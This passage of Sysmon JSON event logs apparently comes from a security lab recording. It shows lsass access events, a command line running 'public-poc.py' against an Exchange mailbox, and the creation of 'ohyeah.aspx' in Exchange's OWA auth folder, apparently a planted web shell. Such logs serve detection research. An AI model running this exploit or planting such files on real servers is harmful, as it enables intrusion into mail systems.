C:\\Windows\\SYSTEM32\\ntdll.dll+a6084|C:\\Windows\\System32\\KERNELBASE.dll+221bd|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+c669|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+c71b|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2fde|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2b9e|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2659|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+1607|C:\\Windows\\system32\\mscoree.dll+1a755|C:\\Windows\\System32\\ADVAPI32.dll+12060|C:\\Windows\\System32\\ADVAPI32.dll+116b5|C:\\Windows\\System32\\KERNELBASE.dll+23d79|C:\\Windows\\System32\\KERNELBASE.dll+2332d|C:\\Windows\\system32\\pdh.dll+63ec|C:\\Windows\\system32\\pdh.dll+56ad|C:\\Windows\\system32\\pdh.dll+149a9|C:\\Windows\\system32\\pdh.dll+1b4fa|C:\\Windows\\system32\\pla.dll+faeff|C:\\Windows\\system32\\pla.dll+f23be|C:\\Windows\\System32\\KERNEL32.DLL+84d4|C:\\Windows\\SYSTEM32\\ntdll.dll+51821", "Task": "10", "RuleName": "-", "UtcTime": "2021-03-14 06:40:05.486", "SourceProcessGUID": "{6004D249-0959-604D-6219-000000000900}", "SourceProcessId": "5172", "SourceThreadId": "12492", "SourceImage": "C:\\Windows\\system32\\rundll32.exe", "TargetProcessGUID": "{6004D249-FD95-604C-0B00-000000000900}", "TargetProcessId": "812", "TargetImage": "C:\\Windows\\system32\\lsass.exe", "GrantedAccess": "0x1400", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+a6084|C:\\Windows\\System32\\KERNELBASE.dll+221bd|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+c669|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+c71b|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2fde|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2b9e|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2659|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+1607|C:\\Windows\\system32\\mscoree.dll+1a755|C:\\Windows\\System32\\ADVAPI32.dll+12060|C:\\Windows\\System32\\ADVAPI32.dll+116b5|C:\\Windows\\System32\\KERNELBASE.dll+23d79|C:\\Windows\\System32\\KERNELBASE.dll+2332d|C:\\Windows\\system32\\pdh.dll+63ec|C:\\Windows\\system32\\pdh.dll+56ad|C:\\Windows\\system32\\pdh.dll+149a9|C:\\Windows\\system32\\pdh.dll+1b4fa|C:\\Windows\\system32\\pla.dll+faeff|C:\\Windows\\system32\\pla.dll+f23be|C:\\Windows\\System32\\KERNEL32.DLL+84d4|C:\\Windows\\SYSTEM32\\ntdll.dll+51821"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "MXS01.azsentinel.local", "TimeCreated": "2021-03-14T01:40:05.500Z", "@timestamp": "2021-03-14T01:40:05.500Z", "EventID": 10, "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2021-03-14 06:40:05.486\r\nSourceProcessGUID: {6004D249-0959-604D-6219-000000000900}\r\nSourceProcessId: 5172\r\nSourceThreadId: 12492\r\nSourceImage: C:\\Windows\\system32\\rundll32.exe\r\nTargetProcessGUID: {6004D249-FD95-604C-0B00-000000000900}\r\nTargetProcessId: 812\r\nTargetImage: C:\\Windows\\system32\\lsass.exe\r\nGrantedAccess: 0x1400\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+a6084|C:\\Windows\\System32\\KERNELBASE.dll+221bd|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+3b59|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+414d|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+d007|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+cb01|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2f5e|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+27fe|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+1607|C:\\Windows\\system32\\mscoree.dll+1a755|C:\\Windows\\System32\\ADVAPI32.dll+12060|C:\\Windows\\System32\\ADVAPI32.dll+116b5|C:\\Windows\\System32\\KERNELBASE.dll+23d79|C:\\Windows\\System32\\KERNELBASE.dll+2332d|C:\\Windows\\system32\\pdh.dll+63ec|C:\\Windows\\system32\\pdh.dll+56ad|C:\\Windows\\system32\\pdh.dll+149a9|C:\\Windows\\system32\\pdh.dll+1b4fa|C:\\Windows\\system32\\pla.dll+faeff|C:\\Windows\\system32\\pla.dll+f23be|C:\\Windows\\System32\\KERNEL32.DLL+84d4|C:\\Windows\\SYSTEM32\\ntdll.dll+51821", "Task": "10", "RuleName": "-", "UtcTime": "2021-03-14 06:40:05.486", "SourceProcessGUID": "{6004D249-0959-604D-6219-000000000900}", "SourceProcessId": "5172", "SourceThreadId": "12492", "SourceImage": "C:\\Windows\\system32\\rundll32.exe", "TargetProcessGUID": "{6004D249-FD95-604C-0B00-000000000900}", "TargetProcessId": "812", "TargetImage": "C:\\Windows\\system32\\lsass.exe", "GrantedAccess": "0x1400", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+a6084|C:\\Windows\\System32\\KERNELBASE.dll+221bd|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+3b59|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+414d|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+d007|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+cb01|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2f5e|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+27fe|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+1607|C:\\Windows\\system32\\mscoree.dll+1a755|C:\\Windows\\System32\\ADVAPI32.dll+12060|C:\\Windows\\System32\\ADVAPI32.dll+116b5|C:\\Windows\\System32\\KERNELBASE.dll+23d79|C:\\Windows\\System32\\KERNELBASE.dll+2332d|C:\\Windows\\system32\\pdh.dll+63ec|C:\\Windows\\system32\\pdh.dll+56ad|C:\\Windows\\system32\\pdh.dll+149a9|C:\\Windows\\system32\\pdh.dll+1b4fa|C:\\Windows\\system32\\pla.dll+faeff|C:\\Windows\\system32\\pla.dll+f23be|C:\\Windows\\System32\\KERNEL32.DLL+84d4|C:\\Windows\\SYSTEM32\\ntdll.dll+51821"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "MXS01.azsentinel.local", "TimeCreated": "2021-03-14T01:40:10.778Z", "@timestamp": "2021-03-14T01:40:10.778Z", "EventID": 1, "Message": "Process Create:\r\nRuleName: -\r\nUtcTime: 2021-03-14 06:40:10.775\r\nProcessGuid: {6004D249-AFCA-604D-2627-000000000900}\r\nProcessId: 11604\r\nImage: C:\\Users\\wardog.MXS01\\AppData\\Local\\Programs\\Python\\Python39\\python.exe\r\nFileVersion: 3.9.2\r\nDescription: Python\r\nProduct: Python\r\nCompany: Python Software Foundation\r\nOriginalFileName: python.exe\r\nCommandLine: python  public-poc.py localhost wardog@azsentinel.local\r\nCurrentDirectory: C:\\Users\\wardog.MXS01\\Documents\\\r\nUser: MXS01\\wardog\r\nLogonGuid: {6004D249-2801-604D-D358-650200000000}\r\nLogonId: 0x26558D3\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA1=A93B3D6D129E3F99E32B6C2EA6A96E896C090B1A,MD5=ADD15A53FD06B29B67959D7A527B16B7,SHA256=786E68DED8AF18F36274D78EA00FF11289C27107DD9F8FDD2F6B4732A3B8A2DA,IMPHASH=F0EA749F47650B36D9712C2C487F984B\r\nParentProcessGuid: {6004D249-4345-604D-961D-000000000900}\r\nParentProcessId: 12788\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" ", "Task": "1", "RuleName": "-", "UtcTime": "2021-03-14 06:40:10.775", "ProcessGuid": "{6004D249-AFCA-604D-2627-000000000900}", "ProcessId": "11604", "Image": "C:\\Users\\wardog.MXS01\\AppData\\Local\\Programs\\Python\\Python39\\python.exe", "FileVersion": "3.9.2", "Description": "Python", "Product": "Python", "Company": "Python Software Foundation", "OriginalFileName": "python.exe", "CommandLine": "python  public-poc.py localhost wardog@azsentinel.local", "CurrentDirectory": "C:\\Users\\wardog.MXS01\\Documents\\", "User": "MXS01\\wardog", "LogonGuid": "{6004D249-2801-604D-D358-650200000000}", "LogonId": "0x26558d3", "TerminalSessionId": "2", "IntegrityLevel": "High", "Hashes": "SHA1=A93B3D6D129E3F99E32B6C2EA6A96E896C090B1A,MD5=ADD15A53FD06B29B67959D7A527B16B7,SHA256=786E68DED8AF18F36274D78EA00FF11289C27107DD9F8FDD2F6B4732A3B8A2DA,IMPHASH=F0EA749F47650B36D9712C2C487F984B", "ParentProcessGuid": "{6004D249-4345-604D-961D-000000000900}", "ParentProcessId": "12788", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "\"C:\\Windows\\system32\\cmd.exe\" "}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "MXS01.azsentinel.local", "TimeCreated": "2021-03-14T01:40:11.609Z", "@timestamp": "2021-03-14T01:40:11.609Z", "EventID": 10, "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2021-03-14 06:40:11.596\r\nSourceProcessGUID: {6004D249-095E-604D-6B19-000000000900}\r\nSourceProcessId: 12860\r\nSourceThreadId: 12996\r\nSourceImage: C:\\Windows\\system32\\rundll32.exe\r\nTargetProcessGUID: {6004D249-FD95-604C-0B00-000000000900}\r\nTargetProcessId: 812\r\nTargetImage: C:\\Windows\\system32\\lsass.exe\r\nGrantedAccess: 0x1400\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+a6084|C:\\Windows\\System32\\KERNELBASE.dll+221bd|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+c669|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+c71b|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2fde|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2b9e|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2659|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+1607|C:\\Windows\\system32\\mscoree.dll+1a755|C:\\Windows\\System32\\ADVAPI32.dll+12060|C:\\Windows\\System32\\ADVAPI32.dll+116b5|C:\\Windows\\System32\\KERNELBASE.dll+23d79|C:\\Windows\\System32\\KERNELBASE.dll+2332d|C:\\Windows\\system32\\pdh.dll+63ec|C:\\Windows\\system32\\pdh.dll+56ad|C:\\Windows\\system32\\pdh.dll+149a9|C:\\Windows\\system32\\pdh.dll+1b4fa|C:\\Windows\\system32\\pla.dll+faeff|C:\\Windows\\system32\\pla.dll+f23be|C:\\Windows\\System32\\KERNEL32.DLL+84d4|C:\\Windows\\SYSTEM32\\ntdll.dll+51821", "Task": "10", "RuleName": "-", "UtcTime": "2021-03-14 06:40:11.596", "SourceProcessGUID": "{6004D249-095E-604D-6B19-000000000900}", "SourceProcessId": "12860", "SourceThreadId": "12996", "SourceImage": "C:\\Windows\\system32\\rundll32.exe", "TargetProcessGUID": "{6004D249-FD95-604C-0B00-000000000900}", "TargetProcessId": "812", "TargetImage": "C:\\Windows\\system32\\lsass.exe", "GrantedAccess": "0x1400", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+a6084|C:\\Windows\\System32\\KERNELBASE.dll+221bd|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+c669|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+c71b|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2fde|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2b9e|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2659|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+1607|C:\\Windows\\system32\\mscoree.dll+1a755|C:\\Windows\\System32\\ADVAPI32.dll+12060|C:\\Windows\\System32\\ADVAPI32.dll+116b5|C:\\Windows\\System32\\KERNELBASE.dll+23d79|C:\\Windows\\System32\\KERNELBASE.dll+2332d|C:\\Windows\\system32\\pdh.dll+63ec|C:\\Windows\\system32\\pdh.dll+56ad|C:\\Windows\\system32\\pdh.dll+149a9|C:\\Windows\\system32\\pdh.dll+1b4fa|C:\\Windows\\system32\\pla.dll+faeff|C:\\Windows\\system32\\pla.dll+f23be|C:\\Windows\\System32\\KERNEL32.DLL+84d4|C:\\Windows\\SYSTEM32\\ntdll.dll+51821"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "MXS01.azsentinel.local", "TimeCreated": "2021-03-14T01:40:11.609Z", "@timestamp": "2021-03-14T01:40:11.609Z", "EventID": 10, "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2021-03-14 06:40:11.596\r\nSourceProcessGUID: {6004D249-095E-604D-6B19-000000000900}\r\nSourceProcessId: 12860\r\nSourceThreadId: 12996\r\nSourceImage: C:\\Windows\\system32\\rundll32.exe\r\nTargetProcessGUID: {6004D249-FD95-604C-0B00-000000000900}\r\nTargetProcessId: 812\r\nTargetImage: C:\\Windows\\system32\\lsass.exe\r\nGrantedAccess: 0x1400\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+a6084|C:\\Windows\\System32\\KERNELBASE.dll+221bd|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+3b59|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+414d|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+d007|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+cb01|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2f5e|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+27fe|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+1607|C:\\Windows\\system32\\mscoree.dll+1a755|C:\\Windows\\System32\\ADVAPI32.dll+12060|C:\\Windows\\System32\\ADVAPI32.dll+116b5|C:\\Windows\\System32\\KERNELBASE.dll+23d79|C:\\Windows\\System32\\KERNELBASE.dll+2332d|C:\\Windows\\system32\\pdh.dll+63ec|C:\\Windows\\system32\\pdh.dll+56ad|C:\\Windows\\system32\\pdh.dll+149a9|C:\\Windows\\system32\\pdh.dll+1b4fa|C:\\Windows\\system32\\pla.dll+faeff|C:\\Windows\\system32\\pla.dll+f23be|C:\\Windows\\System32\\KERNEL32.DLL+84d4|C:\\Windows\\SYSTEM32\\ntdll.dll+51821", "Task": "10", "RuleName": "-", "UtcTime": "2021-03-14 06:40:11.596", "SourceProcessGUID": "{6004D249-095E-604D-6B19-000000000900}", "SourceProcessId": "12860", "SourceThreadId": "12996", "SourceImage": "C:\\Windows\\system32\\rundll32.exe", "TargetProcessGUID": "{6004D249-FD95-604C-0B00-000000000900}", "TargetProcessId": "812", "TargetImage": "C:\\Windows\\system32\\lsass.exe", "GrantedAccess": "0x1400", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+a6084|C:\\Windows\\System32\\KERNELBASE.dll+221bd|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+3b59|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+414d|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+d007|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+cb01|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2f5e|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+27fe|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+1607|C:\\Windows\\system32\\mscoree.dll+1a755|C:\\Windows\\System32\\ADVAPI32.dll+12060|C:\\Windows\\System32\\ADVAPI32.dll+116b5|C:\\Windows\\System32\\KERNELBASE.dll+23d79|C:\\Windows\\System32\\KERNELBASE.dll+2332d|C:\\Windows\\system32\\pdh.dll+63ec|C:\\Windows\\system32\\pdh.dll+56ad|C:\\Windows\\system32\\pdh.dll+149a9|C:\\Windows\\system32\\pdh.dll+1b4fa|C:\\Windows\\system32\\pla.dll+faeff|C:\\Windows\\system32\\pla.dll+f23be|C:\\Windows\\System32\\KERNEL32.DLL+84d4|C:\\Windows\\SYSTEM32\\ntdll.dll+51821"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "MXS01.azsentinel.local", "TimeCreated": "2021-03-14T01:40:13.414Z", "@timestamp": "2021-03-14T01:40:13.414Z", "EventID": 1, "Message": "Process Create:\r\nRuleName: -\r\nUtcTime: 2021-03-14 06:40:13.412\r\nProcessGuid: {6004D249-AFCD-604D-2727-000000000900}\r\nProcessId: 13136\r\nImage: C:\\Windows\\System32\\dllhost.exe\r\nFileVersion: 10.0.14393.0 (rs1_release.160715-1616)\r\nDescription: COM Surrogate\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: dllhost.exe\r\nCommandLine: C:\\Windows\\system32\\DllHost.exe /Processid:{9FA5C497-F46D-447F-8011-05D03D7D7DDC}\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {6004D249-FD95-604C-E703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: SHA1=0E33FA9CE0074155F361DB9CB36183431C8FC266,MD5=DA63852A2B0340E94D74EAF0CD444979,SHA256=EE8364C07B3F4F71FA649E0E6C4C73C15D285130E4B16E79890EEBBF89C2164E,IMPHASH=1C99A7F1249FB0C7B924253B69E59F88\r\nParentProcessGuid: {6004D249-FD96-604C-0C00-000000000900}\r\nParentProcessId: 920\r\nParentImage: C:\\Windows\\System32\\svchost.exe\r\nParentCommandLine: C:\\Windows\\system32\\svchost.exe -k DcomLaunch", "Task": "1", "RuleName": "-", "UtcTime": "2021-03-14 06:40:13.412", "ProcessGuid": "{6004D249-AFCD-604D-2727-000000000900}", "ProcessId": "13136", "Image": "C:\\Windows\\System32\\dllhost.exe", "FileVersion": "10.0.14393.0 (rs1_release.160715-1616)", "Description": "COM Surrogate", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "dllhost.exe", "CommandLine": "C:\\Windows\\system32\\DllHost.exe /Processid:{9FA5C497-F46D-447F-8011-05D03D7D7DDC}", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "NT AUTHORITY\\SYSTEM", "LogonGuid": "{6004D249-FD95-604C-E703-000000000000}", "LogonId": "0x3e7", "TerminalSessionId": "0", "IntegrityLevel": "System", "Hashes": "SHA1=0E33FA9CE0074155F361DB9CB36183431C8FC266,MD5=DA63852A2B0340E94D74EAF0CD444979,SHA256=EE8364C07B3F4F71FA649E0E6C4C73C15D285130E4B16E79890EEBBF89C2164E,IMPHASH=1C99A7F1249FB0C7B924253B69E59F88", "ParentProcessGuid": "{6004D249-FD96-604C-0C00-000000000900}", "ParentProcessId": "920", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "MXS01.azsentinel.local", "TimeCreated": "2021-03-14T01:40:13.660Z", "@timestamp": "2021-03-14T01:40:13.660Z", "EventID": 11, "Message": "File created:\r\nRuleName: -\r\nUtcTime: 2021-03-14 06:40:13.659\r\nProcessGuid: {6004D249-FD90-604C-0100-000000000900}\r\nProcessId: 4\r\nImage: System\r\nTargetFilename: C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\ohyeah.aspx\r\nCreationUtcTime: 2021-03-14 06:40:13.659", "Task": "11", "RuleName": "-", "UtcTime": "2021-03-14 06:40:13.659", "ProcessGuid": "{6004D249-FD90-604C-0100-000000000900}", "ProcessId": "4", "Image": "System", "TargetFilename": "C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\ohyeah.aspx", "CreationUtcTime": "2021-03-14 06:40:13.659"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "MXS01.azsentinel.local", "TimeCreated": "2021-03-14T01:40:14.034Z", "@timestamp": "2021-03-14T01:40:14.034Z", "EventID": 10, "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2021-03-14 06:40:14.033\r\nSourceProcessGUID: {6004D249-FD96-604C-0C00-000000000900}\r\nSourceProcessId: 920\r\nSourceThreadId: 8596\r\nSourceImage: C:\\Windows\\system32\\svchost.exe\r\nTargetProcessGUID: {6004D249-FD95-604C-0B00-000000000900}\r\nTargetProcessId: 812\r\nTargetImage: C:\\Windows\\system32\\lsass.exe\r\nGrantedAccess: 0x1400\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+a6084|C:\\Windows\\System32\\KERNELBASE.dll+5eab4|c:\\windows\\system32\\lsm.dll+f71b|C:\\Windows\\System32\\RPCRT4.dll+78e23|C:\\Windows\\System32\\RPCRT4.dll+d96bd|C:\\Windows\\System32\\RPCRT4.dll+6194c|C:\\Windows\\System32\\RPCRT4.dll+52bf4|C:\\Windows\\System32\\RPCRT4.dll+51b0d|C:\\Windows\\System32\\RPCRT4.dll+523bb|C:\\Windows\\System32\\RPCRT4.dll+2469c|C:\\Windows\\System32\\RPCRT4.dll+24b1c|C:\\Windows\\System32\\RPCRT4.dll+111bc|C:\\Windows\\System32\\RPCRT4.dll+12a1b|C:\\Windows\\System32\\RPCRT4.dll+1e12a|C:\\Windows\\SYSTEM32\\ntdll.dll+1d34e|C:\\Windows\\SYSTEM32\\ntdll.dll+1ecb9|C:\\Windows\\System32\\KERNEL32.DLL+84d4|C:\\Windows\\SYSTEM32\\ntdll.dll+51821", "Task": "10", "RuleName": "-", "UtcTime": "2021-03-14 06:40:14.033", "SourceProcessGUID": "{6004D249-FD96-604C-0C00-000000000900}", "SourceProcessId": "920", "SourceThreadId": "8596", "SourceImage": "C:\\Windows\\system32\\svchost.exe", "TargetProcessGUID": "{6004D249-FD95-604C-0B00-000000000900}", "TargetProcessId": "812", "TargetImage": "C:\\Windows\\system32\\lsass.exe", "GrantedAccess": "0x1400", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+a6084|C:\\Windows\\System32\\KERNELBASE.dll+5eab4|c:\\windows\\system32\\lsm.dll+f71b|C:\\Windows\\System32\\RPCRT4.dll+78e23|C:\\Windows\\System32\\RPCRT4.dll+d96bd|C:\\Windows\\System32\\RPCRT4.dll+6194c|C:\\Windows\\System32\\RPCRT4.dll+52bf4|C:\\Windows\\System32\\RPCRT4.dll+51b0d|C:\\Windows\\System32\\RPCRT4.dll+523bb|C:\\Windows\\System32\\RPCRT4.dll+2469c|C:\\Windows\\System32\\RPCRT4.dll+24b1c|C:\\Windows\\System32\\RPCRT4.dll+111bc|C:\\Windows\\System32\\RPCRT4.dll+12a1b|C:\\Windows\\System32\\RPCRT4.dll+1e12a|C:\\Windows\\SYSTEM32\\ntdll.dll+1d34e|C:\\Windows\\SYSTEM32\\ntdll.dll+1ecb9|C:\\Windows\\System32\\KERNEL32.DLL+84d4|C:\\Windows\\SYSTEM32\\ntdll.dll+51821"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "MXS01.azsentinel.local", "TimeCreated": "2021-03-14T01:40:14.034Z", "@timestamp": "2021-03-14T01:40:14.034Z", "EventID": 10, "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2021-03-14 06:40:14.033\r\nSourceProcessGUID: {6004D249-FD96-604C-0C00-000000000900}\r\nSourceProcessId: 920\r\nSourceThreadId: 8596\r\nSourceImage: C:\\Windows\\system32\\svchost.exe\r\nTargetProcessGUID: {6004D249-FD95-604C-0B00-000000000900}\r\nTargetProcessId: 812\r\nTargetImage: C:\\Windows\\system32\\lsass.exe\r\nGrantedAccess: 0x1400\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+a6084|C:\\Windows\\System32\\KERNELBASE.dll+5eab4|c:\\windows\\system32\\lsm.dll+f86b|C:\\Windows\\System32\\RPCRT4.dll+78e23|C:\\Windows\\System32\\RPCRT4.dll+d96bd|C:\\Windows\\System32\\RPCRT4.dll+6194c|C:\\Windows\\System32\\RPCRT4.dll+52bf4|C:\\Windows\\System32\\RPCRT4.dll+51b0d|C:\\Windows\\System32\\RPCRT4.dll+523bb|C:\\Windows\\System32\\RPCRT4.dll+2469c|C:\\Windows\\System32\\RPCRT4.dll+24b1c|C:\\Windows\\System32\\RPCRT4.dll+111bc|C:\\Windows\\System32\\RPCRT4.dll+12a1b|C:\\Windows\\System32\\RPCRT4.dll+1e12a|C:\\Windows\\SYSTEM32\\ntdll.dll+1d34e|C:\\Windows\\SYSTEM32\\ntdll.dll+1ecb9|C:\\Windows\\System32\\KERNEL32.DLL+84d4|C:\\Windows\\SYSTEM32\\ntdll.dll+51821", "Task": "10", "RuleName": "-", "UtcTime": "2021-03-14 06:40:14.033", "SourceProcessGUID": "{6004D249-FD96-604C-0C00-000000000900}", "SourceProcessId": "920", "SourceThreadId": "8596", "SourceImage": "C:\\Windows\\system32\\svchost.exe", "TargetProcessGUID": "{6004D249-FD95-604C-0B00-000000000900}", "TargetProcessId": "812", "TargetImage": "C:\\Windows\\system32\\lsass.exe", "GrantedAccess": "0x1400", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+a6084|C:\\Windows\\System32\\KERNELBASE.dll+5eab4|c:\\windows\\system32\\lsm.dll+f86b|C:\\Windows\\System32\\RPCRT4.dll+78e23|C:\\Windows\\System32\\RPCRT4.dll+d96bd|C:\\Windows\\System32\\RPCRT4.dll+6194c|C:\\Windows\\System32\\RPCRT4.dll+52bf4|C:\\Windows\\System32\\RPCRT4.dll+51b0d|C:\\Windows\\System32\\RPCRT4.dll+523bb|C:\\Windows\\System32\\RPCRT4.dll+2469c|C:\\Windows\\System32\\RPCRT4.dll+24b1c|C:\\Windows\\System32\\RPCRT4.dll+111bc|C:\\Windows\\System32\\RPCRT4.dll+12a1b|C:\\Windows\\System32\\RPCRT4.dll+1e12a|C:\\Windows\\SYSTEM32\\ntdll.dll+1d34e|C:\\Windows\\SYSTEM32\\ntdll.dll+1ecb9|C:\\Windows\\System32\\KERNEL32.DLL+84d4|C:\\Windows\\SYSTEM32\\ntdll.dll+51821"}
